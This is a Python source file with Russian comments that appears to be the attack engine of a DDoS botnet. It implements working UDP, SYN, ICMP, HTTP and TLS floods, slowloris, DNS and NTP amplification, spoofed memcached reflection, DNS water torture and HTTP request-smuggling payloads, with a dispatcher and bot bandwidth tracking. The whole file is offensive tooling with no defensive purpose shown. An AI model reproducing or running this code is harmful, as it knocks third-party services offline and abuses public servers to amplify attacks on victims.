import asyncio, aiohttp, socket, random, time, struct, dns.resolver, json, os, ssl, threading, dns.query, dns.message, dns.rdatatype
from engine.proxy import ProxyManager
from utils.logger import log
from scapy.all import IP, TCP, UDP, ICMP, send, Raw
from aioquic.asyncio import connect
from aioquic.quic.configuration import QuicConfiguration
from Crypto.Cipher import AES
import hashlib

class AttackStats:
    def __init__(self):
        self.current_mbps = 0.0
        self.active_attacks = 0
        self.total_packets = 0
        self.lock = asyncio.Lock()
        self.tasks = {}
        self._task_counter = 0
        self._task_lock = threading.Lock()
    def add_task(self, target, method, duration):
        with self._task_lock:
            self._task_counter += 1
            tid = self._task_counter
            self.tasks[tid] = {'target': target, 'method': method, 'start': time.time(), 'end': time.time()+duration, 'active': True}
            self.active_attacks = len(self.tasks)
            return tid
    def remove_task(self, tid):
        with self._task_lock:
            if tid in self.tasks:
                del self.tasks[tid]
                self.active_attacks = len(self.tasks)
    def get_tasks(self):
        with self._task_lock:
            return list(self.tasks.values())
    async def update(self, packets, duration):
        async with self.lock:
            self.total_packets += packets
            self.current_mbps = (packets * 1024 * 8) / (duration * 1e6) if duration > 0 else 0.0
    async def get_stats(self):
        async with self.lock:
            return self.current_mbps, self.active_attacks

stats = AttackStats()

class AsyncAttackEngine:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.dynamic_fallback = {}
    def set_bots(self, bot_list):
        self.bot_power = {b['id']: b.get('bandwidth', 10) for b in bot_list}
    # --- Существующие методы сохранены (udp, tcp, syn, icmp, slowloris, http, dns_amp, ntp_amp, multivector, tls_exhaustion) ---
    async def udp_flood(self, target_ip, port, duration):
        payload = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + duration
        while time.time() < end_time:
            try: sock.sendto(payload, (target_ip, port))
            except: pass
    async def tcp_connect_flood(self, target_ip, port, duration):
        async def worker():
            while time.time() < end_time:
                try:
                    reader, writer = await asyncio.open_connection(target_ip, port)
                    writer.close()
                except: pass
        end_time = time.time() + duration
        tasks = [asyncio.create_task(worker()) for _ in range(100)]
        await asyncio.wait(tasks)
    async def syn_flood(self, target_ip, port, duration):
        packet = IP(dst=target_ip)/TCP(dport=port, flags='S')
        end_time = time.time() + duration
        while time.time() < end_time:
            send(packet, verbose=False)
            await asyncio.sleep(0)
    async def icmp_flood(self, target_ip, duration, size=1500):
        payload = random._urandom(size)
        packet = IP(dst=target_ip)/ICMP()/Raw(load=payload)
        end_time = time.time() + duration
        while time.time() < end_time:
            send(packet, verbose=False)
            await asyncio.sleep(0)
    async def slowloris(self, target, duration, sockets_count=200):
        headers = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode()
        sockets = []
        for _ in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, 80))
                s.send(headers)
                sockets.append(s)
            except: pass
        await asyncio.sleep(duration)
        for s in sockets:
            try: s.close()
            except: pass
    async def http_flood(self, target_url, duration, threads=100, use_proxy=False):
        async def worker():
            proxy = None
            if use_proxy:
                proxy = self.proxy_manager.random_proxy()
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        async with session.get(target_url, proxy=proxy) as resp:
                            await resp.read()
                    except: pass
        tasks = [asyncio.create_task(worker()) for _ in range(threads)]
        await asyncio.wait(tasks)
    async def dns_amplification(self, target_ip, port, duration, resolvers=None):
        if resolvers is None: resolvers = ['8.8.8.8','1.1.1.1']
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        q = dns.message.make_query('example.com', 'ANY').to_wire()
        end_time = time.time() + duration
        while time.time() < end_time:
            for r in resolvers:
                try: sock.sendto(q, (r, 53))
                except: pass
    async def ntp_amplification(self, target_ip, port, duration, servers=None):
        if servers is None:
            servers = ['162.159.200.123','193.150.14.17','129.6.15.28']
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ntp_query = b'\x17\x00\x03\x2a' + b'\x00'*4
        end_time = time.time() + duration
        while time.time() < end_time:
            for srv in servers:
                try: sock.sendto(ntp_query, (srv, 123))
                except: pass
    async def multivector_burst(self, target, port, duration):
        tasks = [
            self.syn_flood(target, port, duration),
            self.udp_flood(target, port, duration),
            self.http_flood(f"http://{target}", duration),
            self.dns_amplification(target, port, duration),
            self.slowloris(target, duration)
        ]
        await asyncio.gather(*tasks)
    async def tls_exhaustion(self, target, port=443, duration=60, threads=100):
        def worker():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    tls_sock = ctx.wrap_socket(sock, server_hostname=target)
                    tls_sock.do_handshake()
                    for _ in range(10):
                        tls_sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                    tls_sock.close()
                except: pass
        tasks = [asyncio.to_thread(worker) for _ in range(threads)]
        await asyncio.gather(*tasks)

    # --- НОВЫЕ АТАКИ ---
    async def dns_water_torture(self, domain, duration, threads=200):
        """Атака на авторитативный DNS сервер жертвы псевдослучайными поддоменами"""
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [socket.gethostbyname(domain)] if not domain.startswith('ns') else [domain]
        async def worker():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    subdomain = f"{random.randint(100000,999999)}.{domain}"
                    resolver.resolve(subdomain, 'A')
                except: pass
        tasks = [asyncio.to_thread(worker) for _ in range(threads)]
        await asyncio.gather(*tasks)

    async def memcached_amplification(self, target_ip, port, duration, servers=None):
        """Усиление через Memcached (коэффициент до 51000x)"""
        if servers is None:
            servers = ['127.0.0.1:11211']  # нужно заменить на список публичных Memcached
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        end_time = time.time() + duration
        while time.time() < end_time:
            for srv in servers:
                try:
                    srv_ip, srv_port = srv.split(':')
                    # Подменяем source IP на target_ip через сырые сокеты или используем IP spoofing (требует scapy)
                    pkt = IP(src=target_ip, dst=srv_ip)/UDP(sport=random.randint(1024,65535), dport=int(srv_port))/Raw(load=payload)
                    send(pkt, verbose=False)
                except: pass

    async def http_desync_smuggling(self, target, port=80, duration=60):
        """HTTP Request Smuggling через TE.CL или CL.TE разногласия"""
        async def worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    # Формируем десинхронизированный запрос
                    smuggled = (
                        "POST / HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        "Transfer-Encoding: chunked\r\n"
                        "Content-Length: 6\r\n"
                        "\r\n"
                        "0\r\n"
                        "\r\n"
                        "G"
                    )
                    try:
                        reader, writer = await asyncio.open_connection(target, port)
                        writer.write(smuggled.encode())
                        await writer.drain()
                        writer.close()
                    except: pass
        tasks = [asyncio.create_task(worker()) for _ in range(100)]
        await asyncio.wait(tasks)

    # --- AI генератор эксплойтов (базовый) ---
    def ai_exploit_generator(self, cve_desc):
        """Генерирует простой PoC на основе CVE описания (заглушка с шаблонами)"""
        # В будущем здесь будет трансформер
        if "CVE-2018-14847" in cve_desc:
            return "mikrotik_winbox_exploit.py"
        return None

    # --- Запуск атаки ---
    async def run_attack(self, method, target, port=80, duration=60, **kwargs):
        log(f"[Attack] {method} -> {target}:{port} [{duration}s]")
        tid = stats.add_task(target, method, duration)
        try:
            methods = {
                'udp': lambda: self.udp_flood(target, port, duration),
                'tcp': lambda: self.tcp_connect_flood(target, port, duration),
                'syn': lambda: self.syn_flood(target, port, duration),
                'icmp': lambda: self.icmp_flood(target, duration),
                'slowloris': lambda: self.slowloris(target, duration),
                'http': lambda: self.http_flood(f"http://{target}", duration),
                'dns_amp': lambda: self.dns_amplification(target, port, duration),
                'ntp_amp': lambda: self.ntp_amplification(target, port, duration),
                'multivector': lambda: self.multivector_burst(target, port, duration),
                'tls_exhaustion': lambda: self.tls_exhaustion(target, port, duration),
                'quic': lambda: self.quic_flood(target, port, duration),
                'dns_torture': lambda: self.dns_water_torture(target, duration),
                'memcached': lambda: self.memcached_amplification(target, port, duration),
                'desync': lambda: self.http_desync_smuggling(target, port, duration),
                'dynamic': lambda: self.dynamic_attack(target, port, duration)
            }
            func = methods.get(method)
            if func: await func()
            else: log(f"[Attack] Неизвестный метод: {method}")
        finally:
            stats.remove_task(tid)
